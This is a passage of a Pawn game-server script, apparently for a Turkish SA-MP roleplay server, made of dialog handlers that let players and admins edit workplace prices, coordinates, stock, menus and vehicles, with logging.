	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new Float:isyz = floatstr(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][cikisZ] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri cikisZ degeri: %f olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin cikisZ degerini %f olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 29)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][icikisint] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri cikisINT degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin cikisINT degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 30)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][cikisangle] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri cikisANGLE degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin cikisANGLE degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 31)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][ifiyat] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri fiyat degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin fiyat degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 32)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][girisucreti] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri giriþ ücret degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin giris ucreti degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 33)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][ikasa] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri kasa miktarý: %d$ olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin kasa degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 8883)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][ivergi] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri vergi miktarý: %d$ olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin vergi degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 34)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][ikilit] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri kilit degeri: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 35)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][itip] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri tipi %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin tip degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 36)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][yedekanahtar] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri yedek anahtarý SQLid %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin yedekanahtar SQLID degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 37)
	{
		new yakindaki = IsyeriMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Isyeri[yakindaki][istok] = isyz;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri stoðu %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
	        new log[256];
			format(log, sizeof(log), "[/iduzenle - /isyeriduzenle] %d idli isyerinin stok degerini %d olarak degistirdi.", yakindaki, isyz);
			Log(playerid, log);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 38)
	{
		if(response)
	    {
	        new mesafe;
	    	if(!IsPlayerInAnyVehicle(playerid)) mesafe = IsyeriMesafesi(2.0, playerid);
			else mesafe = IsyeriMesafesi(5.0, playerid);
	    	//new string[256];
			if(listitem == 0)
			{
				ShowPlayerDialog(playerid, 39, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Ýþyeri Adý", ""C1"Burada gerçekleþtirilen her iþlem loglara kayýt edilmektedir.\n"C1"Eski iþyeri adýnýz loglara kaydedildi, yeni iþyeri adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
				ShowPlayerDialog(playerid, 670, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Ýþyeri Tipi",
				"Market\t{33aa33}5.000$\n\
				Restorant\t{33aa33}3.000$\n\
				Bar\t{33aa33}2.500$\n\
				Kýyafet Dükkaný\t{33aa33}5.000$\n\
				Özel Kýyafet Dükkaný\t{33aa33}10.000$\n\
				Silah Dükkaný\t{33aa33}20.000$\n\
				Depo\t{33aa33}2.500$\n\
				Mobilya Dükkaný\t{33aa33}10.000$\n\
				GYM\t{33aa33}5.000$\n\
				Modifiye Garajý\t{33aa33}300.000$\n\
				Sevkiyat Þirketi\t{33aa33}500.000$\n\
				Spor Aletleri Dükkaný\t{33aa33}2.500$\n\
				Galeri\t{33aa33}400.000$\n\
				Super Sport Galeri\t{33aa33}1.000.000$\n\
				Hafriyat Þirketi\t{33aa33}500.000$\n\
				Ofis\t{33aa33}5.000$\n\
				Taksi Þirketi\t{33aa33}-\n\
				Otobüs Þirketi\t{33aa33}-\n\
				Kiralýk Araç Þirketi\t{33aa33}-\n\
				Hastane\t{33aa33}-\n\
				Benzin Ýstasyonu\t{33aa33}-",
				"Onayla", "Kapat");
			}
			if(listitem == 3)
			{
				ShowPlayerDialog(playerid, 72, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Ýþyeri Karþýlama Metni", ""C1"Ýþyerinizin karþýlama metni, yalnýzca içeriye giriþ yapýldýðýnda gözükür.\n"C1"Özel karakter kullanmayýn, yalnýzca metni girin:", "Onayla", "Kapat");
			}
			if(listitem == 4)
			{
				if(Isyeri[mesafe][itip] == 2 || Isyeri[mesafe][itip] == 3 || Isyeri[mesafe][itip] == 4 || Isyeri[mesafe][itip] == 5)
				{
					new mstring[2048],query[128],rows,fields,_ttip[12],__ad[32];
					format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",mesafe);
					new Cache:cache = mysql_query(query,true);
                    cache_get_data(rows, fields, g_iHandle);
                    for (new i = 0; i < rows; i ++)
                    {
                        cache_get_field_content(i, "isim", __ad);
                        if(cache_get_field_content_int(i, "tip") == 1) _ttip = "Yiyecek";
                        else if(cache_get_field_content_int(i, "tip") == 2) _ttip = "Ýçecek";
						format(mstring, sizeof(mstring), "%s\n%s\t%s\t%d\t%d",
						mstring,
						_ttip,
						__ad,
						cache_get_field_content_int(i, "fiyat"),
                        cache_get_field_content_int(i, "model"));
					}
					cache_delete(cache);
					format(mstring, sizeof(mstring), "Yiyecek/Ýçecek\tÝsim\tFiyat\tModel\n%s\n"C2"Menü Ekle",mstring);
					ShowPlayerDialog(playerid, 347, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Ýþyeri Menü", mstring, "Tamam", "Ýptal");
					SetPVarInt(playerid, "MenuIsyeriID", mesafe);
				}
				else
				{
				    Hata(playerid, "Yalnýzca sahip olduðunuz Bar ve Restorantlarýn menüsünü düzenleyebilirsiniz.");
				}
			}
			if(listitem == 5)
			{
				ShowPlayerDialog(playerid, 369, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Stok Güncelle", ""C1"Ýþyerine ne kadar stok almak istiyorunusuz:\n"C2"(Stok baþý 10$)","Stok Güncelle", "Ýptal");
			}
			if(listitem == 6)
			{
			    new mstring[512];
				for(new i=0;i<10;i++)
				{
				    if(Isyeri[mesafe][isci][i] != -1)
				    {
				        format(mstring, sizeof(mstring), "%s\n"C2"Ýþçi\t\t "C1"%s",mstring, SQLFromName(Isyeri[mesafe][isci][i]));
					}
				}
				format(mstring, sizeof(mstring), "%s\n"C2"Ýþçi Al", mstring);
				ShowPlayerDialog(playerid, 344, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Ýþçi", mstring, "Seç", "Ýptal");
			}
			if(listitem == 7)
			{
			    ShowPlayerDialog(playerid, 229, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Ýþyeri Giriþ Fiyatý", ""C1"Ýþyerinizin giriþ fiyatýný kaç olarak ayarlamak istersiniz:", "Onayla", "Kapat");
			}
			if(listitem == 8)
			{
			}
			if(listitem == 9)
			{
			    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Herhangi bir aracýn içinde deðilsiniz.");
			    if(Arac[GetPlayerVehicleID(playerid)][atip] == 5 || Karakter[playerid][sqlid] != Arac[GetPlayerVehicleID(playerid)][aowner]) return Hata(playerid, "Bu aracý iþyeri aracý yapamazsýnýz.");
			    if(Arac[GetPlayerVehicleID(playerid)][aisyeri] != mesafe)
			    {
				    Arac[GetPlayerVehicleID(playerid)][aisyeri] = mesafe;
				    Bilgi(playerid, "Aracý iþyeri aracý yaptýnýz.");
				}
				else
				{
				    Arac[GetPlayerVehicleID(playerid)][aisyeri] = 0;
				    Bilgi(playerid, "Aracý iþyeri aracý olmaktan çýkardýnýz.");
				}
				AracKaydet(GetPlayerVehicleID(playerid));
			}
			if(listitem == 10)
			{
			    new mstring[2048];
				for(new i;i<MAX_VEHICLES;i++)
				{
				    if(mesafe == Arac[i][aisyeri])
					{
					    if(Arac[i][atip] == 10)
						{
							format(mstring, sizeof(mstring), "%s%s\t[{B3B3B3}%d{FFFFFF}]\t"C2"(Sevkiyat Aracý)\n",mstring,VehicleName[GetVehicleModel(i)-400][0],i);
						}
						else if(Arac[i][atip] == 14)
						{
							format(mstring, sizeof(mstring), "%s%s\t[{B3B3B3}%d{FFFFFF}]\t"C2"(Hafriyat Aracý)\n",mstring,VehicleName[GetVehicleModel(i)-400][0],i);
						}
					    else
						{
							format(mstring, sizeof(mstring), "%s%s\t[{B3B3B3}%d{FFFFFF}]\n",mstring,VehicleName[GetVehicleModel(i)-400][0],i);
						}
					}
				}
				ShowPlayerDialog(playerid, 381, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Ýþyeri Araçlar", mstring, "Seç", "Ýptal");
			}
		}
		return 1;
	}
	if(dialogid == 39)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new string[128];
	        new yakindaki = IsyeriMesafesi(2.0,playerid);
	        if(yakindaki == 0)
	        {
	            return 1;
			}
	        strmid(Isyeri[yakindaki][iad], inputtext, 0, strlen(inputtext), 255);
	        IsyeriKaydet(yakindaki);
	        format(string, sizeof(string), "Ýþyeri bilgileri kayýt edildi! Yeni iþyeri adý: %s olarak deðiþtirildi.",inputtext);
	        Bilgi(playerid, string);
	        IsyeriAyarla(yakindaki);
		}
		return 1;
	}
	if(dialogid == 40)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			Hata(playerid, "Bu seçenek henüz aktif edilmemiþ!");
		}
		return 1;
	}
	if(dialogid == 41)
	{
	    if(response)
	    {
		}
		return 1;
	}
	if(dialogid == 42)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 43, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 44, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 43)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun1], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun1], Isyeri[yakindaki][urunfiyat][0]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 44)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][0] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun1], Isyeri[yakindaki][urunfiyat][0]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 45)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 46, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 47, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 46)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun2], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun2], Isyeri[yakindaki][urunfiyat][1]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 47)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][1] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun2], Isyeri[yakindaki][urunfiyat][1]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 48)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 49, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 50, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 49)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun3], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun3], Isyeri[yakindaki][urunfiyat][2]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 50)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][2] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun3], Isyeri[yakindaki][urunfiyat][2]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 51)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 52, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 53, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 52)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun4], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun4], Isyeri[yakindaki][urunfiyat][3]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 53)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][3] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun4], Isyeri[yakindaki][urunfiyat][3]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 54)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 55, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 56, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 55)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun5], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun5], Isyeri[yakindaki][urunfiyat][4]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 56)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][4] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun5], Isyeri[yakindaki][urunfiyat][4]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 57)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 58, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 59, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 58)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun6], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun6], Isyeri[yakindaki][urunfiyat][5]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 59)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][5] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun6], Isyeri[yakindaki][urunfiyat][5]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 60)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 61, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 62, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 61)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun7], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun7], Isyeri[yakindaki][urunfiyat][6]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 62)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][6] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun7], Isyeri[yakindaki][urunfiyat][6]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 63)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 64, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 65, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 64)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun8], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun8], Isyeri[yakindaki][urunfiyat][7]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 65)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    Isyeri[yakindaki][urunfiyat][7] = strval(inputtext);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü fiyatýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun8], Isyeri[yakindaki][urunfiyat][7]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 66)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 67, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü adýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, 68, DIALOG_STYLE_INPUT, "Ýþyerinizin menüsünü yönetin!", "Ýþyerinizi yönetiyorsunuz!\nMenü fiyatýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 67)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
 		  	new string[128];
      		new yakindaki = IsyeriMesafesi(2.0, playerid);
		    strmid(Isyeri[yakindaki][urun9], inputtext, 0, strlen(inputtext), 255);
		    IsyeriKaydet(yakindaki);
		    format(string, sizeof(string), "Menü adýný düzenlediniz. %s - %d$", Isyeri[yakindaki][urun9], Isyeri[yakindaki][urunfiyat][8]);
		    Bilgi(playerid, string);
		}
		return 1;
	}
	if(dialogid == 68)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
